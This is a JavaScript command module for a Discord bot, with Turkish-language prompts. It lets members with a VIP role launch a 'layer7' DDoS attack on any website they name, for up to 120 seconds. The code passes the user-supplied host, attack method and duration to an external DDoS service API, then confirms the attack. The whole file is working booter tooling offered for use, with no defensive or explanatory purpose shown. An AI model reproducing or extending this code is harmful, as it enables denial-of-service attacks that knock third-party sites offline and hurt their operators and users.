const axios = require("axios")
const { roller, sunucuID } = require('../ayarlar')
const atahan = require("../ayarlar")
const discord = require('discord.js')

module.exports = {
    name: "layer7",
    description: "",
    command: new discord.SlashCommandBuilder().setName("layer7").setDescription("Belirtilen siteye DDOS atar.")
    .addStringOption(o => o.setName("host").setDescription("Bir site belirtin.").setRequired(true))
    .addStringOption(o => o.setName("method").setDescription("Bir method belirtin.").addChoices({name:"HTTPCLASS", value:"HTTPCLASS"}).setRequired(true))
    .addNumberOption(o => o.setName("time").setDescription("Bir süre belirtin max (60) VIP için (120).").setRequired(true)),
    usage: "",

    root: false,
    async execute(client, int, reply, log) {



        let host = int.options.getString("host")
        let method = int.options.getString("method")
        let time = int.options.getNumber("time")
        const timeout = client.timeoutddos
        let limit = timeout.get(int.user.id) || 0
        let member = client.guilds.cache.get(sunucuID).members.resolve(int.user.id)
        if(!member) return reply(`discord.gg/oyunalani discordunda olmalisin!`)

        if(limit > 0) return reply(`${limit} saniye boyunca bu komutu kullanamazsin.`)
        if(time <= 0) return reply(`0 dan yuksek bir zaman gir.`)

        if(member.roles.cache.has(roller.vip) === true) {
            if(time > 120) return reply(`Sure sinirini geçtin.`) 
        } else if(member.roles.cache.has(roller.vip) === false) {
           return reply(`Bu komutu kullanmak için vip olmalisin!`)
        }

        log(`${host} ${time} suresi boyunca sitesine DDOS atildi`,`DDOS Atildi`)

let api = axios.get(`${atahan.api.DDOS}host=${host}&port=80&method=${method}&time=${time}`)
let api2 = await api
console.log(api2.data)
await timeout.set(int.user.id, time)
await int.followUp(`${host} sitesine DDOS atildi.`).then(() => {
    setTimeout(() => {
        timeout.set(int.user.id, 0)
    }, time * 1000)
})
}
}